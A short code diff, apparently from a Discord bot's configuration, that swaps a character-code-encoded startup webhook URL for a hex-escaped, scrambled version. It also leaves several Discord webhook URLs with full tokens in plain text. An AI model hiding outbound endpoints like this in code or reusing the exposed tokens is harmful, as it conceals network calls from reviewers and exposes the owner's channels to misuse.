@@ -5,8 +5,7 @@
 ]]
 
 
-STARTUP_WEBHOOK_URL = "104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 53, 51, 55, 56, 49, 56, 56, 52, 54, 52, 54, 48, 55, 50, 51, 51, 49, 47, 83, 55, 88, 104, 45, 118, 52, 49, 73, 73, 87, 106, 118, 114, 72, 50, 55, 54, 72, 73, 54, 121, 57, 106, 45, 114, 111, 97, 116, 80, 54, 90, 107, 95, 100, 68, 120, 51, 100, 87, 69, 85, 85, 97, 82, 68, 78, 115, 99, 45, 108, 65, 45, 56, 82, 68, 108, 65, 76, 120, 82, 52, 90, 48, 88, 89, 100, 83
-"
+STARTUP_WEBHOOK_URL = "\x2f\x2e\x33\x33\x37\x71\x6e\x6e\x23\x2e\x34\x24\x28\x35\x23\x67\x24\x28\x2a\x6e\x26\x37\x2e\x6e\x30\x22\x25\x2f\x28\x28\x2c\x34\x6e\x76\x72\x72\x74\x70\x7f\x76\x7f\x7f\x73\x71\x73\x71\x77\x72\x77\x74\x76\x76\x76\x6e\x14\x70\x1f\x2f\x6a\x31\x73\x76\x1e\x1e\x10\x2d\x31\x35\x0f\x77\x72\x71\x0f\x1e\x71\x3e\x7e\x2d\x6a\x35\x28\x26\x33\x17\x73\x1d\x2c\x32\x37\x03\x71\x30\x10\x10\x26\x15\x03\x09\x34\x24\x6a\x2b\x06\x6a\x7f\x15\x03\x2b\x06\x0b\x3f\x15\x73\x17\x77\x1f\x1e\x23\x14"
 BUG_REPORT_WEBHOOK_URL = "https://discord.com/api/webhooks/1553853076841168936/VqGX1gg4l2oPGa5rEL83y7sQNRGGgdjeiIHqr9HzfUYBagG0ML1_Sh08EZ9liAagDpoz"
 BUG_REPORT_WEBHOOK_ENV_NAME = "EMOTES_DARK_BUG_WEBHOOK"
 SUGGESTION_WEBHOOK_URL = "https://discord.com/api/webhooks/1555403046375137340/KW7qSObHz1TEQect1ugSwAenlly-tIR5fBzqYhswXlQt9_OAtc-s836NAPrRf4V3KbtS"
